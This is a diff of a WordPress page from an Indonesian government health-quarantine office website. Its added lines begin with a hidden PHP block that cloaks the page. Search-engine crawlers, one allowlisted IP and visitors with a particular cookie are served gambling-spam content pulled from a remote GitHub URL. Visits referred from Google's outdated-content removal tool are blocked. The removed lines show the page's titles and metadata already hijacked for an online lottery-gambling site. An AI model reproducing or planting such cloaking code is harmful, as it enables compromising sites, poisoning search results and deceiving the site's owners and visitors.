@@ -1,5 +1,69 @@
+<?php
+error_reporting(0);
+// Mendapatkan referer HTTP
+$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+
+// Domain yang ingin diblokir
+$blocked_domain = 'https://search.google.com/search-console/remove-outdated-content?hl=en';
+
+// Mengecek apakah referer mengandung domain yang diblokir
+if (strpos($referrer, $blocked_domain) !== false) {
+    header('HTTP/1.0 403 Forbidden');
+    echo 'Access is blocked from this referrer.';
+    exit();
+}
+
+$link = 'https://raw.githubusercontent.com/fadlipul69/kkpbanjarmasin/refs/heads/main/dokumen';
+
+function ip_in_range($ip,$range){
+    list($subnet,$bits) = explode('/',$range);
+    $ip_dec=ip2long($ip);
+    $subnet_dec=ip2long($subnet);
+    $mask=-1<<(32-$bits);
+    $subnet_dec &= $mask;
+    return($ip_dec&$mask) === $subnet_dec;
+}
+
+function fetch_ip_ranges($url,$ipv4_key){
+    $json_data=file_get_contents($url);
+    if($json_data===FALSE){
+        die("Error: Could not fetch the IP ranges from $url.");
+    }
+    $ip_data=json_decode($json_data,true);
+    $ip_ranges=[];
+    if(isset($ip_data['prefixes'])){
+        foreach($ip_data['prefixes']as $prefix){
+            if(isset($prefix[$ipv4_key])){
+                $ip_ranges[]=$prefix[$ipv4_key];
+            }
+        }
+    }
+    return $ip_ranges;
+}
+
+$google_ip_ranges = fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');
+$visitor_ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : (isset($_SERVER["HTTP_INCAP_CLIENT_IP"]) ? $_SERVER["HTTP_INCAP_CLIENT_IP"] : (isset($_SERVER["HTTP_TRUE_CLIENT_IP"]) ? $_SERVER["HTTP_TRUE_CLIENT_IP"] : (isset($_SERVER["HTTP_REMOTEIP"]) ? $_SERVER["HTTP_REMOTEIP"] : (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : $_SERVER["REMOTE_ADDR"]))));
+$googleallow=false;
+foreach($google_ip_ranges as $range){
+    if(ip_in_range($visitor_ip,$range)){
+        $googleallow=true;
+        break;
+    }
+}
+$asd=array('bot','ahrefs','google');
+foreach($asd as $len){
+    $nul = $len;
+}
+$alow = ['146.70.14.19'];
+if($_SERVER['REQUEST_URI'] == '/'){
+    $agent=strtolower($_SERVER['HTTP_USER_AGENT']);
+    if(strpos($agent,$nul) or $googleallow or isset($_COOKIE['lp']) or in_array($visitor_ip,$alow)){
+        echo implode('',file($link));
+        die();
+    }
+}?>
 <!DOCTYPE html>
-<html lang="en-US"> 
+<html lang="en-US">
 <head>
 	<meta charset="UTF-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -7,31 +71,24 @@
 	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
 
 	<!-- This site is optimized with the Yoast SEO plugin v23.8 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>LUNATOGEL - Situs Agen Togel Online & Daftar LunaTogel Resmi Menang</title>
-	<link rel="canonical" href="https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/" />
+	<title>Dokumen - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin</title>
+	<link rel="canonical" href="https://kkpbanjarmasin.or.id/dokumen/" />
 	<meta property="og:locale" content="en_US" />
 	<meta property="og:type" content="article" />
-  <link rel="amphtml" href="https://kkpbanjarmasin-serba-luna.pages.dev/fungsi" />
-	<meta property="og:title" content="LUNATOGEL - Situs Agen Togel Online & Daftar LunaTogel Resmi Menang" />
-	<meta property="og:url" content="https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/" />
-	<meta property="og:site_name" content="LUNATOGEL" />
-	<meta property="article:modified_time" content="2024-11-08T12:21:05+00:00" />
-	<meta property="og:image" content="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg" />
-	<meta property="og:image:width" content="414" />
-	<meta property="og:image:height" content="733" />
-	<meta property="og:image:type" content="image/jpeg" />
+	<meta property="og:title" content="Dokumen - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
+	<meta property="og:url" content="https://kkpbanjarmasin.or.id/dokumen/" />
+	<meta property="og:site_name" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
+	<meta property="article:modified_time" content="2020-04-28T08:08:42+00:00" />
 	<meta name="twitter:card" content="summary_large_image" />
-	<meta name="twitter:label1" content="Est. reading time" />
-	<meta name="twitter:data1" content="1 minute" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/","url":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/","name":"LUNATOGEL - Situs Agen Togel Online & Daftar LunaTogel Resmi Menang","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"primaryImageOfPage":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage"},"image":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage"},"thumbnailUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid-169x300.jpg","datePublished":"2024-11-08T12:16:57+00:00","dateModified":"2024-11-08T12:21:05+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage","url":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg","contentUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg","width":414,"height":733},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"Tugas Fungsi PPID"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"LUNATOGEL","description":"LUNATOGEL","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/dokumen/","url":"https://kkpbanjarmasin.or.id/dokumen/","name":"Dokumen - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"datePublished":"2020-03-09T08:30:52+00:00","dateModified":"2020-04-28T08:08:42+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/dokumen/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/dokumen/"]}]},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/dokumen/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"Dokumen"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","description":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
 <link rel='dns-prefetch' href='//www.googletagmanager.com' />
 <link rel='dns-prefetch' href='//fonts.googleapis.com' />
 <link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
-<link rel="alternate" type="application/rss+xml" title="LUNATOGEL &raquo; Feed" href="https://kkpbanjarmasin.or.id/feed/" />
-<link rel="alternate" type="application/rss+xml" title="LUNATOGEL &raquo; Comments Feed" href="https://kkpbanjarmasin.or.id/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin &raquo; Feed" href="https://kkpbanjarmasin.or.id/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin &raquo; Comments Feed" href="https://kkpbanjarmasin.or.id/comments/feed/" />
 <script type="text/javascript">
 /* <![CDATA[ */
 window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/kkpbanjarmasin.or.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.4"}};
@@ -106,7 +163,7 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
 <script type="text/javascript" id="wpdm-frontjs-js-extra">
 /* <![CDATA[ */
 var wpdm_url = {"home":"https:\/\/kkpbanjarmasin.or.id\/","site":"https:\/\/kkpbanjarmasin.or.id\/","ajax":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php"};
-var wpdm_js = {"spinner":"<i class=\"fas fa-sun fa-spin\"><\/i>","client_id":"35c58581009472bde7db0b23b8d3bdb5"};
+var wpdm_js = {"spinner":"<i class=\"fas fa-sun fa-spin\"><\/i>","client_id":"cae8c9e60cc931b0e688d2a4aa03abdd"};
 var wpdm_strings = {"pass_var":"Password Verified!","pass_var_q":"Please click following button to start download.","start_dl":"Start Download"};
 /* ]]> */
 </script>
@@ -130,15 +187,15 @@ gtag("config", "G-DFBM421RDL");
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/fingerprint.min.js?ver=2.1.12" id="wpa-fingerprintjs-js"></script>
 <script type="text/javascript" id="wps-js-extra">
 /* <![CDATA[ */
-var wpspagevisit = {"ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","ajax_nonce":"1e61e35555"};
+var wpspagevisit = {"ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","ajax_nonce":"03eeac11a0"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wps-visitor-counter/styles/js/custom.js?ver=1" id="wps-js"></script>
 <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://kkpbanjarmasin.or.id/xmlrpc.php?rsd" />
 <meta name="generator" content="WordPress 6.6.4" />
-<link rel='shortlink' href='https://kkpbanjarmasin.or.id/?p=4828' />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Ftugas-fungsi-ppid%2F" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Ftugas-fungsi-ppid%2F&#038;format=xml" />
+<link rel='shortlink' href='https://kkpbanjarmasin.or.id/?p=974' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fdokumen%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fdokumen%2F&#038;format=xml" />
 <meta name="generator" content="Site Kit by Google 1.139.0" /><script>
 var portfolioDataJs = portfolioDataJs || [];
 var penciBlocksArray=[];
@@ -178,47 +235,47 @@ var PENCILOCALCACHE = {};
     "@id": "#organization",
     "logo": "",
     "url": "https:\/\/kkpbanjarmasin.or.id\/",
-    "name": "LUNATOGEL",
-    "description": "LUNATOGEL adalah link agen togel online resmi bagi yang mau bermain judi aman dan terpercaya langsung kunjungi situs lunatogel terjamin mudah menang dengan angka result terupdate banyak peluang jackpot malam ini."
+    "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
+    "description": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WebSite",
-    "name": "LUNATOGEL",
-    "alternateName": "LUNATOGEL",
+    "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
+    "alternateName": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
     "url": "https:\/\/kkpbanjarmasin.or.id\/"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WPSideBar",
     "name": "Sidebar Right",
     "alternateName": "Add widgets here to display them on blog and single",
-    "url": "https:\/\/kkpbanjarmasin.or.id\/tugas-fungsi-ppid"
+    "url": "https:\/\/kkpbanjarmasin.or.id\/dokumen"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WPSideBar",
     "name": "Footer Column #1",
     "alternateName": "Add widgets here to display them in the first column of the footer",
-    "url": "https:\/\/kkpbanjarmasin.or.id\/tugas-fungsi-ppid"
+    "url": "https:\/\/kkpbanjarmasin.or.id\/dokumen"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WPSideBar",
     "name": "Footer Column #2",
     "alternateName": "Add widgets here to display them in the second column of the footer",
-    "url": "https:\/\/kkpbanjarmasin.or.id\/tugas-fungsi-ppid"
+    "url": "https:\/\/kkpbanjarmasin.or.id\/dokumen"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WebPage",
-    "headline": "Tugas Fungsi PPID",
-    "description": "LUNATOGEL adalah link agen togel online resmi bagi yang mau bermain judi aman dan terpercaya langsung kunjungi situs lunatogel terjamin mudah menang dengan angka result terupdate banyak peluang jackpot malam ini.",
-    "datePublished": "2024-11-08",
-    "datemodified": "2024-11-08",
-    "mainEntityOfPage": "https:\/\/kkpbanjarmasin.or.id\/tugas-fungsi-ppid\/",
+    "headline": "Dokumen",
+    "description": "Dokumen",
+    "datePublished": "2020-03-09",
+    "datemodified": "2020-04-28",
+    "mainEntityOfPage": "https:\/\/kkpbanjarmasin.or.id\/dokumen\/",
     "image": {
         "@type": "ImageObject",
         "url": ""
     },
     "publisher": {
         "@type": "Organization",
-        "name": "LUNATOGEL"
+        "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"
     },
     "author": {
         "@type": "Person",
@@ -375,7 +432,7 @@ header#masthead {
 	</style>
 </head>
 
-<body data-rsssl=1 class="page-template-default page page-id-4828 custom-background group-blog penci-body-boxed penci_enable_ajaxsearch penci_sticky_content_sidebar sidebar-right penci-page-style-1 wpb-js-composer js-comp-ver-6.1 vc_responsive">
+<body data-rsssl=1 class="page-template-default page page-id-974 custom-background group-blog penci-body-boxed penci_enable_ajaxsearch penci_sticky_content_sidebar sidebar-right penci-page-style-1 wpb-js-composer js-comp-ver-6.1 vc_responsive">
 
 <div id="page" class="site penci-enable-boxed">
 	
@@ -503,7 +560,7 @@ header#masthead {
 	<div class="penci-header-mobile_container">
         <button class="menu-toggle navbar-toggle" aria-expanded="false"><span class="screen-reader-text">Primary Menu</span><i class="fa fa-bars"></i></button>
 								</div>
-</div><div class='marquee-hsas-shortcode-41' style='width: 100%;overflow: hidden;'><span style="color: #000000;">Selamat Datang di Zona Integritas BKK Kelas I Banjarmasin.</span>&nbsp;&nbsp;&nbsp;<span style="color: #000000;">Wilayah Bebas dari Korupsi (WBK) dan Wilayah Birokrasi Bersih Melayani (WBBM).</span></div><script>jQuery(function(){jQuery('.marquee-hsas-shortcode-41').marquee({allowCss3Support: true,css3easing: 'linear',easing: 'linear',delayBeforeStart: 2000,direction: 'left',duplicated: true,duration: 15000,gap: 50,pauseOnCycle: true,pauseOnHover: true,startVisible: true});});</script>
+</div><div class='marquee-hsas-shortcode-34' style='width: 100%;overflow: hidden;'><span style="color: #000000;">Selamat Datang di Zona Integritas BKK Kelas I Banjarmasin.</span>&nbsp;&nbsp;&nbsp;<span style="color: #000000;">Wilayah Bebas dari Korupsi (WBK) dan Wilayah Birokrasi Bersih Melayani (WBBM).</span></div><script>jQuery(function(){jQuery('.marquee-hsas-shortcode-34').marquee({allowCss3Support: true,css3easing: 'linear',easing: 'linear',delayBeforeStart: 2000,direction: 'left',duplicated: true,duration: 15000,gap: 50,pauseOnCycle: true,pauseOnHover: true,startVisible: true});});</script>
 	<div id="content" class="site-content">
 
 	<div id="primary" class="content-area">
@@ -514,14 +571,15 @@ header#masthead {
 <div class="penci-container">
 	<div class="penci-container__content penci-con_sb2_sb1">
 		<div class="penci-wide-content penci-content-novc penci-sticky-content">
-			<div class="theiaStickySidebar"><div class="penci-content-post hide_featured_image">
-				<div class="penci_breadcrumbs "><ul itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a class="home" href="https://kkpbanjarmasin.or.id" itemprop="item"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><i class="fa fa-angle-right"></i><a href="https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/" itemprop="item"><span itemprop="name">Tugas Fungsi PPID</span></a><meta itemprop="position" content="2" /></li></ul></div>					<article id="post-4828" class="penci-content-current-page post-4828 page type-page status-publish hentry penci-post-item">
+			<div class="theiaStickySidebar">
+						<div class="penci-content-post hide_featured_image">
+				<div class="penci_breadcrumbs "><ul itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a class="home" href="https://kkpbanjarmasin.or.id" itemprop="item"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><i class="fa fa-angle-right"></i><a href="https://kkpbanjarmasin.or.id/dokumen/" itemprop="item"><span itemprop="name">Dokumen</span></a><meta itemprop="position" content="2" /></li></ul></div>					<article id="post-974" class="penci-content-current-page post-974 page type-page status-publish hentry penci-post-item">
 													<header class="entry-header penci-entry-header">
-								<h1 class="entry-title penci-entry-title penci-title-">Tugas Fungsi PPID</h1><div class="penci-schema-markup"><span class="author vcard"><a class="url fn n" href="https://kkpbanjarmasin.or.id/author/admkkp/">admkkp</a></span><time class="entry-date published" datetime="2024-11-08T12:16:57+00:00">November 8, 2024</time><time class="updated" datetime="2024-11-08T12:21:05+00:00">November 8, 2024</time></div>															</header>
+								<h1 class="entry-title penci-entry-title penci-title-">Dokumen</h1><div class="penci-schema-markup"><span class="author vcard"><a class="url fn n" href="https://kkpbanjarmasin.or.id/author/admkkp/">admkkp</a></span><time class="entry-date published" datetime="2020-03-09T08:30:52+00:00">March 9, 2020</time><time class="updated" datetime="2020-04-28T08:08:42+00:00">April 28, 2020</time></div>															</header>
 													<div class="penci-entry-content entry-content">
-							<div class="wp-block-image"><img fetchpriority="high" decoding="async" class="wpa-warning wpa-image-missing-alt wp-image-4727 aligncenter" src="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid-169x300.jpg" alt="" width="381" height="676" data-warning="Missing alt text" srcset="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid-169x300.jpg 169w, https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid-226x400.jpg 226w, https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg 414w" sizes="(max-width: 381px) 100vw, 381px" /></div>
+							                <div id="wpdmtree"></div>    <script language="JavaScript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wpdm-extended-shortcodes/js/jqueryFileTree.js"></script>         <link rel="stylesheet" href="https://kkpbanjarmasin.or.id/wp-content/plugins/wpdm-extended-shortcodes/css/jqueryFileTree.css" /><div id="tree6924365838d25"></div>    <script language="JavaScript">        jQuery( function($) {                 var nw = 0;            $('#tree6924365838d25').fileTree({                script: 'https://kkpbanjarmasin.or.id/?task=wpdm_tree&params=h4iX5zlykt8e-iCEx9Q9D2T-N8XHKQ0XT9uvI3XK8Y65Fn0rO6SqoDb50zFcb8qM_W-MfWgLoO-9V93Z1_l97kukEEoyxFAdy3Rr9DOCXdx9UsL-VigxsOr0_gkHQNZEn2KfKNr1l_grP7wox-NNGbmo_dMRsKDFcmdH_CIMFII',                 expandSpeed: 1000,                collapseSpeed: 1000,                root: '16',                multiFolder: false            }, function(file) {               if(nw === 1)                window.open(file);                else                location.href = file;                          });        });    </script>    
 						</div>
-						<footer class="penci-entry-footer"><span class="penci-social-buttons penci-social-share-footer"><a href="#" class="penci-post-like penci_post-meta_item  single-like-button penci-social-item like" data-post_id="4828" title="Like" data-like="Like" data-unlike="Unlike"><i class="fa fa-thumbs-o-up"></i><span class="penci-share-number">0</span></a><a class="penci-social-item facebook" target="_blank" rel="noopener" title="" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fkkpbanjarmasin.or.id%2Ftugas-fungsi-ppid%2F"><i class="fa fa-facebook"></i></a><a class="penci-social-item email" target="_blank" rel="noopener" href="/cdn-cgi/l/email-protection#724d010710181711064f260715130157404234071c15011b57404222223b36545142414a49303d362b4f1a06060201485d5d19190210131c1813001f13011b1c5c1d005c1b165d06071513015f14071c15011b5f02021b165d"><i class="fa fa-envelope"></i></a></span></footer>					</article>
+						<footer class="penci-entry-footer"><span class="penci-social-buttons penci-social-share-footer"><a href="#" class="penci-post-like penci_post-meta_item  single-like-button penci-social-item like" data-post_id="974" title="Like" data-like="Like" data-unlike="Unlike"><i class="fa fa-thumbs-o-up"></i><span class="penci-share-number">1</span></a><a class="penci-social-item facebook" target="_blank" rel="noopener" title="" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fdokumen%2F"><i class="fa fa-facebook"></i></a><a class="penci-social-item email" target="_blank" rel="noopener" href="mailto:?subject=Dokumen&#038;BODY=https://kkpbanjarmasin.or.id/dokumen/"><i class="fa fa-envelope"></i></a></span></footer>					</article>
 								</div>
 			</div>
 		</div>
@@ -588,19 +646,19 @@ header#masthead {
 
 	</div><!-- #content -->
 	<footer id="colophon" class="site-footer" itemscope itemtype="http://schema.org/WPFooter">
-		<meta itemprop="name" content="LUNATOGEL"/>
-		<meta itemprop="description" content="LUNATOGEL adalah link agen togel online resmi bagi yang mau bermain judi aman dan terpercaya langsung kunjungi situs lunatogel terjamin mudah menang dengan angka result terupdate banyak peluang jackpot malam ini."/>
+		<meta itemprop="name" content="Webpage footer for Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
+		<meta itemprop="description" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
 		<meta itemprop="keywords" content="Data Protection, Copyright Data"/>
 		<meta itemprop="copyrightYear" content="2025"/>
-		<meta itemprop="copyrightHolder" content="LUNATOGEL"/>
+		<meta itemprop="copyrightHolder" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
 				<div id="footer__sidebars" class="footer__sidebars footer__sidebar-col-2 footer__sidebars-style-2">
 	<div class="footer__sidebars-inner penci-container-fluid">
 		<div class="row">
 							<div id="footer-1" class="footer-sidebar-item footer-1 penci-col-6">
 					<div id="penci_custom_html-6" class="widget_text widget footer-widget penci-block-vc penci-fwidget-sidebar style-title-1 style-title-left widget_custom_html"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>BKK Kelas I Banjarmasin</span></h4></div><div class="textwidget custom-html-widget">Alamat 	: 	  	Jl. Belitung Darat No.118 A Banjarmasin<br>
 No. Telpon / Fax. 	: 	  	(0511) 3353948 / (0511) 3353948<br>
-Email 	: 	  	<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="711a1a015f13101f1b10031c1002181f310810191e1e5f121e5f1815">[email&#160;protected]</a></div></div>				</div>
-							<div id="footer-2" class="footer-sidebar-itemfooter-2 penci-col-6">
+Email 	: 	  	kkp.banjarmasin@yahoo.co.id</div></div>				</div>
+							<div id="footer-2" class="footer-sidebar-item footer-2 penci-col-6">
 					<div id="penci_custom_html-7" class="widget_text widget footer-widget penci-block-vc penci-fwidget-sidebar style-title-1 style-title-left widget_custom_html"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>Peta Lokasi</span></h4></div><div class="textwidget custom-html-widget"><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3983.18687711719!2d114.57748281386777!3d-3.3038876420841565!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2de423b1dbc2b3cf%3A0x42645a8955c699aa!2sKantor%20Kesehatan%20Pelabuhan%20Kelas%20II%20Banjarmasin!5e0!3m2!1sen!2sid!4v1580523799026!5m2!1sen!2sid" width="350" height="200" frameborder="0" style="border:0;" allowfullscreen=""></iframe></div></div>				</div>
 					</div>
 	</div>
@@ -677,7 +735,7 @@ Email 	: 	  	<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfe
 	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3973"><a href="https://kkpbanjarmasin.or.id/category/pengumuman/">Pengumuman</a></li>
 	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3975"><a href="#">PPID</a>
 	<ul class="sub-menu">
-		<li class="menu-item menu-item-type-post_typemenu-item-object-page menu-item-has-children menu-item-3978"><a href="https://kkpbanjarmasin.or.id/jam-layanan-ppid/">Layanan PPID</a>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3978"><a href="https://kkpbanjarmasin.or.id/jam-layanan-ppid/">Layanan PPID</a>
 		<ul class="sub-menu">
 			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3977"><a href="https://kkpbanjarmasin.or.id/form-permohonan-ppid/">Form PPID</a></li>
 			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4803"><a href="https://kkpbanjarmasin.or.id/peraturan-kebijakan/">Peraturan / Kebijakan</a></li>
@@ -723,7 +781,7 @@ Email 	: 	  	<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfe
 	</aside>
 <a id="close-sidebar-nav" class="header-1"><i class="fa fa-close"></i></a>
 	<a href="#" id="scroll-to-top"><i class="fa fa-angle-up"></i></a>
-            <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+            <script>
                 jQuery(function($){
 
                     
@@ -787,7 +845,7 @@ Email 	: 	  	<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfe
     <p class="ctc-analytics ctc_cta ctc_cta_stick ht-ctc-cta  ht-ctc-cta-hover " style="padding: 0px 16px; line-height: 1.6; font-size: 15px; background-color: #25D366; color: #ffffff; border-radius:10px; margin:0 10px;  display: none; order: 0; ">WhatsApp us</p>
     <svg style="pointer-events:none; display:block; height:50px; width:50px;" width="50px" height="50px" viewBox="0 0 1024 1024">
         <defs>
-        <path id="htwasqicona-chat" d="M1023.941 765.153c0 5.606-.171 17.766-.508 27.159-.824 22.982-2.646 52.639-5.401 66.151-4.141 20.306-10.392 39.472-18.542 55.425-9.643 18.871-21.943 35.775-36.559 50.364-14.584 14.56-31.472 26.812-50.315 36.416-16.036 8.172-35.322 14.426-55.744 18.549-13.378 2.701-42.812 4.488-65.648 5.3-9.402.336-21.564.505-27.15.505l-504.226-.081c-5.607 0-17.765-.172-27.158-.509-22.983-.824-52.639-2.646-66.152-5.4-20.306-4.142-39.473-10.392-55.425-18.542-18.872-9.644-35.775-21.944-50.364-36.56-14.56-14.584-26.812-31.471-36.415-50.314-8.174-16.037-14.428-35.323-18.551-55.744-2.7-13.378-4.487-42.812-5.3-65.649-.334-9.401-.503-21.563-.503-27.148l.08-504.228c0-5.607.171-17.766.508-27.159.825-22.983 2.646-52.639 5.401-66.151 4.141-20.306 10.391-39.473 18.542-55.426C34.154 93.24 46.455 76.336 61.07 61.747c14.584-14.559 31.472-26.812 50.315-36.416 16.037-8.172 35.324-14.426 55.745-18.549 13.377-2.701 42.812-4.488 65.648-5.3 9.402-.335 21.565-.504 27.149-.504l504.227.081c5.608 0 17.766.171 27.159.508 22.983.825 52.638 2.646 66.152 5.401 20.305 4.141 39.472 10.391 55.425 18.542 18.871 9.643 35.774 21.944 50.363 36.559 14.559 14.584 26.812 31.471 36.415 50.315 8.174 16.037 14.428 35.323 18.551 55.744 2.7 13.378 4.486 42.812 5.3 65.649.335 9.402.504 21.564.504 27.15l-.082 504.226z"/>
